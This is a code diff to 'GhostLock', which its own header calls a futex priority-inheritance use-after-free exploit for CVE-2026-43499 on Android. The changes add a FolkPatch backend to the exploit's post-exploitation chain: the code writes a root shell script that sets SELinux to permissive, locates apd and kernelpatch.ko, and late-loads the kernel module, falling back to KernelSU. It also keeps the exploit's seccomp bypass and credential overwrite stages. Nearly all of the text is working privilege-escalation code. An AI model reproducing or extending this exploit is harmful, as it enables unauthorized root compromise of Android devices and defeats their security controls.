@@ -1,8 +1,8 @@
 /*
- * GhostLock — CVE-2026-43499 futex PI UAF exploit
+ * GhostLock 鈥?CVE-2026-43499 futex PI UAF exploit
  *
  * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
- * independent root shell: ksud late-load + module watch.
+ * independent root shell: FolkPatch jailbreak (preferred) else ksud late-load.
  */
 
 #include "common.h"
@@ -466,7 +466,7 @@ static void init_runtime_paths(void) {
 }
 
 static void write_root_script(void) {
-  char script[4096];
+  char script[16384];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
   if (sfd < 0) {
     pr_warning("open root script failed path=%s errno=%d\n",
@@ -476,13 +476,79 @@ static void write_root_script(void) {
 
   int n = snprintf(
       script, sizeof(script),
-      "#!/system/bin/sh\n"
+            "#!/system/bin/sh\n"
       "HOME_DIR='%s'\n"
       "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
-      "KSUD=\"$HOME_DIR/ksud\"\n"
-      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
+      "FP_LOG=\"$HOME_DIR/.ghostlock_fp.log\"\n"
+      "BACKEND=\"${GHOSTLOCK_BACKEND:-auto}\"\n"
+      "echo \"[*] root script start uid=$(id -u) euid=$(id -u) backend=$BACKEND\" >\"$LOG\"\n"
+      "echo \"[*] root script start uid=$(id -u) euid=$(id -u) backend=$BACKEND\" >\"$FP_LOG\"\n"
       "chmod 644 \"$LOG\" 2>/dev/null\n"
+      "chmod 644 \"$FP_LOG\" 2>/dev/null\n"
       "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
+      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+      "echo \"[*] uname=$(uname -r)\" >>\"$FP_LOG\"\n"
+      "if [ \"$(id -u)\" -ne 0 ]; then\n"
+      "  echo '[!] temp su unavailable; aborting' | tee -a \"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "FP_READY=0\n"
+      "if [ \"$BACKEND\" != \"ksu\" ]; then\n"
+      "  FP_APD=\"\"\n"
+      "  for c in \"/data/adb/apd\" \"/data/adb/ap/apd\" \"/data/local/tmp/apd\" \"$HOME_DIR/apd\"; do\n"
+      "    if [ -x \"$c\" ]; then FP_APD=\"$c\"; break; fi\n"
+      "  done\n"
+      "  if [ -z \"$FP_APD\" ]; then\n"
+      "    FP_APD=$(find /data/app -path '*/me.yuki.folk*/lib/arm64/libapd.so' 2>/dev/null | head -1)\n"
+      "  fi\n"
+      "  if [ -n \"$FP_APD\" ] && [ ! -x \"$FP_APD\" ]; then chmod 755 \"$FP_APD\" 2>/dev/null; fi\n"
+      "  echo \"[*] fp_apd=$FP_APD\" >>\"$FP_LOG\"\n"
+      "  KVER=$(uname -r | cut -d. -f1-2)\n"
+      "  AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
+      "  KMI=\"${AVER}-${KVER}\"\n"
+      "  if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then KMI=android15-6.6; fi\n"
+      "  FP_KO=\"\"\n"
+      "  for c in \"$HOME_DIR/kernelpatch.ko\" \"/data/data/me.yuki.folk/files/kernelpatch.ko\" \"/data/adb/ap/${KMI}_kernelpatch.ko\" \"/data/adb/ap/kernelpatch.ko\" \"$HOME_DIR/${KMI}_kernelpatch.ko\"; do\n"
+      "    if [ -f \"$c\" ]; then FP_KO=\"$c\"; break; fi\n"
+      "  done\n"
+      "  echo \"[*] fp_ko=$FP_KO kmi=$KMI\" >>\"$FP_LOG\"\n"
+      "  if [ -z \"$FP_APD\" ]; then\n"
+      "    echo '[!] FolkPatch unavailable: apd not found' >>\"$FP_LOG\"\n"
+      "    if [ \"$BACKEND\" = \"fp\" ]; then exit 1; fi\n"
+      "  elif [ -z \"$FP_KO\" ]; then\n"
+      "    echo '[!] FolkPatch unavailable: kernelpatch.ko not found' >>\"$FP_LOG\"\n"
+      "    if [ \"$BACKEND\" = \"fp\" ]; then exit 1; fi\n"
+      "  else\n"
+      "    if [ -d /sys/module/kernelpatch ]; then\n"
+      "      echo '[+] FolkPatch module already loaded' >>\"$FP_LOG\"\n"
+      "      FP_READY=1\n"
+      "    else\n"
+      "      echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "      echo \"[*] fp setenforce 0 rc=$?\" >>\"$FP_LOG\"\n"
+      "      \"$FP_APD\" late-load --module \"$FP_KO\" --kmi \"$KMI\" --package-name me.yuki.folk >>\"$FP_LOG\" 2>&1\n"
+      "      echo \"[*] fp late-load exit=$?\" >>\"$FP_LOG\"\n"
+      "      for i in $(seq 1 50); do\n"
+      "        if [ -d /sys/module/kernelpatch ] || [ -f /data/adb/ap/jailbreak ]; then FP_READY=1; break; fi\n"
+      "        sleep 0.1\n"
+      "      done\n"
+      "    fi\n"
+      "    if [ \"$FP_READY\" -eq 1 ]; then\n"
+      "      echo '[+] FolkPatch jailbreak ready' | tee -a \"$FP_LOG\"\n"
+      "      echo \"[*] fp root pid=$$ uid=$(id -u)\" >>\"$FP_LOG\"\n"
+      "      echo \"[*] fp module=$(ls -d /sys/module/kernelpatch 2>/dev/null)\" >>\"$FP_LOG\"\n"
+      "      echo \"[*] fp marker=$(ls -l /data/adb/ap/jailbreak 2>/dev/null)\" >>\"$FP_LOG\"\n"
+      "      echo \"[*] fp getenforce=$(getenforce 2>/dev/null)\" >>\"$FP_LOG\"\n"
+      "      exit 0\n"
+      "    else\n"
+      "      echo '[!] FolkPatch late-load failed; falling back to KernelSU' | tee -a \"$FP_LOG\"\n"
+      "      if [ \"$BACKEND\" = \"fp\" ]; then exit 1; fi\n"
+      "    fi\n"
+      "  fi\n"
+      "else\n"
+      "  echo '[!] FolkPatch unavailable: backend forced to ksu' >>\"$FP_LOG\"\n"
+      "fi\n"
+      "if [ \"$BACKEND\" != \"fp\" ]; then\n"
+      "KSUD=\"$HOME_DIR/ksud\"\n"
       "if [ ! -x \"$KSUD\" ]; then\n"
       "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
       "fi\n"
@@ -494,10 +560,6 @@ static void write_root_script(void) {
       "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
       "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
       "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
-      "if [ \"$(id -u)\" -ne 0 ]; then\n"
-      "  echo '[!] temp su unavailable; aborting' | tee -a \"$LOG\"\n"
-      "  exit 1\n"
-      "fi\n"
       "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
       "  if [ ! -x \"$KSUD\" ]; then\n"
       "    echo '[!] ksud missing; cannot late-load' | tee -a \"$LOG\"\n"
@@ -542,6 +604,7 @@ static void write_root_script(void) {
       "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
       "else\n"
       "  echo '[!] fixup failed; SELinux left permissive' | tee -a \"$LOG\"\n"
+      "fi\n"
       "fi\n",
       g_home_dir);
   if (n < 0 || n >= (int)sizeof(script)) {
@@ -556,21 +619,28 @@ static void write_root_script(void) {
   chmod(g_root_script_path, 0755);
 }
 
-static int kernelsu_module_loaded(void) {
+static int kernel_module_loaded(const char *name) {
   FILE *modules = fopen("/proc/modules", "r");
   if (!modules) return 0;
 
   char line[256];
   int loaded = 0;
   while (fgets(line, sizeof(line), modules)) {
-    char name[64];
-    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
+    char mname[64];
+    if (sscanf(line, "%63s", mname) == 1 && strcmp(mname, name) == 0) {
       loaded = 1;
       break;
     }
   }
   fclose(modules);
   return loaded;
+}
+
+static int kernelsu_module_loaded(void) { return kernel_module_loaded("kernelsu"); }
+
+static int folkpatch_module_loaded(void) {
+  return kernel_module_loaded("kernelpatch") ||
+         access("/sys/module/kernelpatch", F_OK) == 0;
 }
 
 /* Find a task through perf sample records. */
@@ -712,7 +782,7 @@ static void child_main(struct child_pipes *p) {
   }
   close(p->cmd_r);
   if (getuid() != 0) { close(p->uid_w); _exit(1); }
-  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
+  /* Don't leak app-side fds into the root shell chain: FolkPatch/KSU
    * daemons must not keep their write ends open. */
   for (int fd = 3; fd < 1024; fd++) {
     int fl = fcntl(fd, F_GETFD);
@@ -721,7 +791,7 @@ static void child_main(struct child_pipes *p) {
   pid_t worker = fork();
   if (worker == 0) {
     /* Detach into a brand-new session: the independent root shell owns the
-     * whole chain (ksud late-load + module watch) and must survive the
+     * whole backend chain (FolkPatch or KSU) and must survive the
      * exploit parent killing this group on timeout. */
     if (setsid() < 0) _exit(1);
     execl("/system/bin/sh", "sh", g_root_script_path, NULL);
@@ -1020,7 +1090,7 @@ int run_exploit(int argc, char **argv) {
     }
 
     if (!seccomp_ok) {
-      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
+      pr_warning("W3 seccomp clear failed; backend late-load will likely stay blocked\n");
       continue; /* respawn and redo the chain */
     }
     pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
@@ -1028,7 +1098,7 @@ int run_exploit(int argc, char **argv) {
   }
 
   if (!seccomp_ok)
-    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
+    pr_warning("W3 seccomp bypass failed after 3 chain rounds; backend late-load will likely stay blocked\n");
 
   sleep(2);
   TIMER("exploit complete");
@@ -1036,7 +1106,7 @@ int run_exploit(int argc, char **argv) {
     if (write(pipes.cmd_w, "G", 1) != 1)
       pr_warning("failed to start root shell (child exited early)\n");
   } else {
-    pr_warning("skipping late-load: child died during W3\n");
+    pr_warning("skipping backend late-load: child died during W3\n");
   }
   close(pipes.cmd_w);
   if (child_alive) {
@@ -1058,41 +1128,70 @@ int run_exploit(int argc, char **argv) {
   }
   close(pipes.uid_r);
 
-  int kernelsu_ready = 0;
-  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
+  /* Poll FolkPatch jailbreak first (preferred backend), then KernelSU. */
+  int folkpatch_ready = 0;
+  for (int i = 0; i < 30 && !(folkpatch_ready = folkpatch_module_loaded()); i++) {
     usleep(100000);
   }
   /* untrusted_app loses /proc/modules once enforcing is restored, so poll
-   * the app-readable log for the loaded-module line (up to ~30s). */
-  int ksu_log_loaded = 0;
-  int ksu_log_failed = 0;
-  for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
-    char ksu_log_path[320];
-    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
-    FILE *lf = fopen(ksu_log_path, "r");
+   * the app-readable logs for the loaded-module line (up to ~30s). */
+  int fp_log_loaded = 0;
+  int fp_log_failed = 0;
+  int fp_log_skip = 0;
+  for (int i = 0; i < 60 && !(fp_log_loaded || fp_log_failed || fp_log_skip); i++) {
+    char fp_log_path[320];
+    snprintf(fp_log_path, sizeof(fp_log_path), "%s/.ghostlock_fp.log", g_home_dir);
+    FILE *lf = fopen(fp_log_path, "r");
     if (lf) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
-        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
-        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
+        if (strstr(line, "[+] FolkPatch jailbreak ready")) fp_log_loaded = 1;
+        if (strstr(line, "[!] FolkPatch late-load failed")) fp_log_failed = 1;
+        if (strstr(line, "[!] FolkPatch unavailable")) fp_log_skip = 1;
       }
       fclose(lf);
     }
-    if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
+    if (!(fp_log_loaded || fp_log_failed || fp_log_skip)) usleep(500000);
   }
-  kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+  folkpatch_ready = folkpatch_ready || fp_log_loaded;
 
-  /* The detached root shell runs the fixup: permissive, load_policy, then
-   * enforcing. The permissive window restores network; the policy reload
-   * is what keeps it working after enforcing is restored. */
-  if (kernelsu_ready)
+  int kernelsu_ready = 0;
+  int ksu_log_failed = 0;
+  if (!folkpatch_ready) {
+    for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
+      usleep(100000);
+    }
+    int ksu_log_loaded = 0;
+    for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
+      char ksu_log_path[320];
+      snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
+      FILE *lf = fopen(ksu_log_path, "r");
+      if (lf) {
+        char line[256];
+        while (fgets(line, sizeof(line), lf)) {
+          if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+          if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
+        }
+        fclose(lf);
+      }
+      if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
+    }
+    kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+  }
+
+  /* The detached root shell runs either the FolkPatch jailbreak chain
+   * (insmod kernelpatch.ko -> magisk policy live -> enforcing) or the
+   * KernelSU chain (ksud late-load -> load_policy -> enforcing). */
+  if (folkpatch_ready)
+    pr_success("FolkPatch jailbreak ready; policy fixup result in .ghostlock_fp.log\n");
+  else if (kernelsu_ready)
     pr_success("KernelSU ready; policy fixup result in .ghostlock_ksu.log\n");
-  else if (ksu_log_failed)
-    pr_warning("KernelSU module load failed (see .ghostlock_ksu.log)\n");
+  else if (ksu_log_failed || fp_log_failed)
+    pr_warning("root ready; module load failed (see .ghostlock_fp.log / .ghostlock_ksu.log)\n");
   else if (seccomp_ok)
-    pr_warning("temporary root ready; KernelSU module load pending (independent root shell; see .ghostlock_ksu.log)\n");
+    pr_warning("temporary root ready; module load pending (independent root shell; see .ghostlock_*.log)\n");
   else
-    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
+    pr_warning("temporary root ready; module not loaded (W3 seccomp clear failed)\n");
   return 0;
 }
 
